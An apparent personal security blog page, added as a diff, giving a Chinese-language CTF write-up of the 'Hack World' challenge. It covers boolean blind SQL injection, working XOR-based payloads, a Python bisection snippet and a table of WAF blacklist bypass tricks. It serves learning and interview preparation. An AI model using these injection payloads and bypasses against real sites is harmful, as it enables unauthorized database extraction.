@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL 盲注与 WAF 黑名单绕过</title>
+<meta name="description" content="WAF 黑名单绕过的手法拆解：用制表符替代空格、用异或替代 and/or、分析黑名单的子串匹配逻辑，以及布尔盲注的二分探测方法。">
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <a class="logo" href="../index.html">pressure-J<span>.</span></a>
+    <nav>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">文章</a>
+      <a href="https://github.com/pressure-J">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="post-head">
+    <h1>SQL 盲注与 WAF 黑名单绕过</h1>
+    <div class="meta"><span class="cat">Web 安全</span>2026-07-15</div>
+  </div>
+  <div class="content">
+<h1 id="web-sql-waf-hack-world">Web 安全：SQL 盲注与 WAF 绕过解题全流程（Hack World 实战）</h1>
+<blockquote>
+<p>来源：NSSCTF Hack World 实战（与 BUUCTF 同源题），2026-09-01 全流程手打复现
+定位：WAF 黑名单 + 布尔盲注，CTF Web 高频题型；"如何绕过过滤/盲注怎么写脚本"面试必问
+实战场景：任何拦 <code>and</code>/<code>or</code>/空格的注入点，任何只有"真/假"两种回显的页面</p>
+</blockquote>
+<hr />
+<h2 id="_1">一、题型识别与环境侦察</h2>
+<p><strong>题面特征</strong>：<code>Hack World</code>，提示"flag 在表 <code>flag</code> 的列 <code>flag</code>"，POST 一个 <code>id</code> 参数。</p>
+<p><strong>侦察动作（按顺序做，全都只发几次请求）</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>返回</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>id=1</code></td>
+<td><code>Hello, glzjin wants a girlfriend.</code></td>
+<td>正常响应基线</td>
+</tr>
+<tr>
+<td><code>id=2</code></td>
+<td>另一句话</td>
+<td>说明每行有不同回显（回显位 = id 值）</td>
+</tr>
+<tr>
+<td><code>id=0</code></td>
+<td><code>Error Occured When Fetch Result.</code></td>
+<td>查不到 → 报错，<strong>布尔盲注的"假"响应</strong></td>
+</tr>
+<tr>
+<td><code>id=1'</code></td>
+<td><code>bool(false)</code></td>
+<td>SQL 语法错误 → <strong>数字型注入</strong>（无引号包裹，不用闭合）</td>
+</tr>
+<tr>
+<td><code>id=1 or 1=1</code></td>
+<td><code>SQL Injection Checked.</code></td>
+<td>存在 <strong>WAF</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>注入类型判断口诀</strong>：<code>1'</code> 报语法错误 → 数字型；<code>1'</code> 报错/正常闭合 → 字符型；回显只有两种 → 盲注路线。</p>
+<blockquote>
+<p>注意：布尔盲注成立的<strong>前提</strong>是存在两个稳定可区分的响应。本题就是 <code>Hello</code>（真） vs <code>Error</code>（假）。</p>
+</blockquote>
+<hr />
+<h2 id="waf">二、WAF 过滤探测（全流程最核心，坑最多）</h2>
+<p><strong>方法</strong>：构造"数字 + 关键字 + 数字"的探测 payload 逐个提交，靠响应<strong>三分类</strong>定位过滤规则：</p>
+<ul>
+<li><code>SQL Injection Checked.</code> → 关键字被拦（WAF）</li>
+<li><code>bool(false)</code>（语法错误） → 关键字<strong>放行</strong>（只是语法写错）</li>
+<li>正常/Hello/Error → 放行</li>
+</ul>
+<p><strong>坑 1：空格才是元凶（本例最大坑）</strong>
+<code>1 length 1</code> 被拦，第一反应以为是 <code>length</code> 被过滤——其实 <code>length</code>、<code>database</code> 全都放行，被拦是因为<strong>空格本身在黑名单里</strong>。用制表符 <code>\t</code> 代替空格重测：<code>1\tlength\t1</code> → 放行。→ <strong>探测时所有分隔符统一换 <code>\t</code>，把"空格的影响"和"关键字的影响"分开</strong>。</p>
+<p><strong>坑 2：黑名单是子串匹配</strong>
+WAF 拦 <code>or</code>，于是 <code>xor</code>、<code>ord</code>、<code>floor</code>、<code>order</code>（都含 <code>or</code> 子串）全部<strong>连带被拦</strong>；而 <code>from</code>（f-r-o-m）恰好不含 <code>or</code>，正常放行。→ 构造 payload 时检查整串里有没有被拦子串。</p>
+<p><strong>坑 3：括号代替空格</strong>
+过滤只针对 <code>0x20</code> 空格，制表符 <code>\t</code>、换行 <code>\n</code>、括号都放行 → <code>select(flag)from(flag)</code> 全程无空格，合法可执行。</p>
+<p><strong>本题最终过滤清单（实战结论）</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>被拦</th>
+<th>放行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>空格 <code>0x20</code>、<code>+</code> <code>-</code> <code>*</code> <code>&amp;</code> <code>"</code> <code>#</code> <code>--</code> <code>/*</code></td>
+<td><code>\t</code>、<code>^</code> <code>=</code> <code>&gt;</code> <code>&lt;</code> <code>,</code> <code>'</code> <code>(</code> <code>)</code> <code>%</code> <code>/</code></td>
+</tr>
+<tr>
+<td>关键字子串：<code>or</code> <code>and</code> <code>xor</code> <code>union</code> <code>group</code> <code>limit</code> <code>insert</code> <code>update</code> <code>delete</code> <code>ord</code> <code>floor</code> <code>rand</code></td>
+<td><code>select</code> <code>from</code> <code>where</code> <code>substr</code> <code>ascii</code> <code>length</code> <code>database</code> <code>concat</code> 等</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="oracle">三、构造异或布尔盲注 oracle</h2>
+<p><strong>and/or 被拦 → 用异或 <code>^</code> 做布尔运算</strong>（XOR 真值表中 1^1=0、1^0=1，天然是"条件"载体）：</p>
+<div class="highlight"><pre><span></span><code><span class="mi">0</span><span class="o">^</span><span class="p">(</span><span class="err">条件</span><span class="p">)</span><span class="w">   </span><span class="err">→</span><span class="w"> </span><span class="err">条件真：</span><span class="mi">0</span><span class="o">^</span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="err">有数据</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">回显</span><span class="w"> </span><span class="n">Hello</span>
+<span class="w">            </span><span class="err">条件假：</span><span class="mi">0</span><span class="o">^</span><span class="mi">0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">查无此行</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">回显</span><span class="w"> </span><span class="n">Error</span>
+</code></pre></div>
+
+<p><strong>先花一次请求验证查询链路通不通</strong>（题目已经告诉你表和列，直接查，省掉枚举 information_schema）：</p>
+<div class="highlight"><pre><span></span><code>0^(select(2)from(flag))   → 若回显 id=2 那句话 → select/from/flag表/flag列 全部可用 ✓
+</code></pre></div>
+
+<p><strong>表达式模板（全程无空格、无引号）</strong>：</p>
+<ul>
+<li>长度：<code>0^((length((select(flag)from(flag)))&gt;N))</code></li>
+<li>字符：<code>0^((ascii(substr((select(flag)from(flag)),i,1))&gt;M))</code>（ASCII 与数字比较，避开引号字符串）</li>
+</ul>
+<hr />
+<h2 id="_2">四、自动化二分盲注（写脚本）</h2>
+<p>线上一秒一发不现实，必须脚本化。核心思路：<strong>把"数据库内容"变成"一个个布尔判断题"，二分逼近</strong>。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 核心循环：长度二分</span>
+<span class="n">lo</span><span class="p">,</span> <span class="n">hi</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">128</span>
+<span class="k">while</span> <span class="n">lo</span> <span class="o">&lt;</span> <span class="n">hi</span><span class="p">:</span>
+    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+    <span class="k">if</span> <span class="n">post</span><span class="p">(</span><span class="s2">"0^((length((select(flag)from(flag)))&gt;</span><span class="si">%d</span><span class="s2">))"</span> <span class="o">%</span> <span class="n">mid</span><span class="p">):</span> <span class="n">lo</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span> <span class="n">hi</span> <span class="o">=</span> <span class="n">mid</span>
+<span class="c1"># 字符二分：ASCII 32~127，每字符约 7 次请求</span>
+
+<span class="c1"># 三件套：真/假响应关键词判定 + 超时重试 + 遇 '}' 提前终止</span>
+</code></pre></div>
+
+<p><strong>请求量估算（面试常问）</strong>：长度 ~7 次 + 每字符 ~7 次 → 44 字符 ≈ <strong>350 次请求 ≈ 2~3 分钟</strong>；若线性扫描要 4000+ 次 → 这就是必须二分的理由。</p>
+<p>完整可直接改的模板脚本：<code>&lt;工作目录&gt;\ctf\sqli_blind_template.py</code>（改 CONFIG 区即可套用新题）。</p>
+<hr />
+<h2 id="_3">五、绕过招式扩展（同类题变种）</h2>
+<table>
+<thead>
+<tr>
+<th>被拦的东西</th>
+<th>替代方案</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>and</code> / <code>or</code></td>
+<td><code>^</code> 异或、<code>|</code> 位或、<code>&amp;&amp;</code>/<code>||</code>（若未拦）</td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>\t</code>、<code>\n</code>、括号 <code>()</code>、注释符（若未拦 <code>/*</code>）</td>
+</tr>
+<tr>
+<td><code>substr</code></td>
+<td><code>mid()</code>、<code>substring()</code>、<code>left()/right()</code> 组合</td>
+</tr>
+<tr>
+<td><code>ascii</code></td>
+<td><code>ord()</code>、<code>hex()</code> 取首字符</td>
+</tr>
+<tr>
+<td><code>=</code></td>
+<td><code>&gt;</code> / <code>&lt;</code> 二分照样跑（oracle 换成大小判断）</td>
+</tr>
+<tr>
+<td><code>,</code></td>
+<td><code>substr(x from 1 for 1)</code> 的 from-for 语法</td>
+</tr>
+<tr>
+<td>引号 <code>'</code></td>
+<td>十六进制字符串 <code>0x...(hex)</code></td>
+</tr>
+<tr>
+<td><code>select</code>/<code>from</code></td>
+<td>内联注释 <code>sel/**/ect</code>（前提 <code>/*</code> 未被过滤）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>工具边界</strong>：sqlmap 面对定制 WAF（空格+子串黑名单）默认模板几乎必被拦或慢死，<code>--tamper</code> 空间有限；手工探测清单 + 自写脚本反而稳定可控。但<strong>先懂手工流程，sqlmap 输出才读得懂</strong>。</p>
+<hr />
+<h2 id="_4">六、面试速答卡</h2>
+<ul>
+<li><strong>布尔盲注三件套</strong>：<code>length()</code> 猜长度 → <code>substr()</code> 取位 → <code>ascii()</code> 转数值二分</li>
+<li><strong>异或为什么能绕过 and/or</strong>：<code>0^(条件)</code>，条件真 → 1，假 → 0；<code>^</code> 不在黑名单里</li>
+<li><strong>空格被拦怎么办</strong>：制表符/换行/括号/注释符，探测时先用 <code>\t</code> 重测区分"空格"与"关键字"的过滤</li>
+<li><strong>子串黑名单的坑</strong>：拦 <code>or</code> 连带 <code>xor/ord/floor/order</code>，检查 payload 全串无被拦子串</li>
+<li><strong>盲注请求量怎么估</strong>：长度 ~7 次 + 每字符 ~7 次（二分），线性扫描慢 10 倍以上</li>
+<li><strong>数字型 vs 字符型</strong>：<code>1'</code> 语法错误 = 数字型（无引号包裹）；需闭合引号 = 字符型</li>
+<li><strong>最快验证查询链路</strong>：<code>0^(select(常量)from(目标表))</code> 回显对应 id 即通</li>
+</ul>
+  </div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div>&copy; 2026 pressure-J · 网络安全方向</div>
+    <div><a href="https://github.com/pressure-J">GitHub</a></div>
+  </div>
+</footer>
+</body>
+</html>
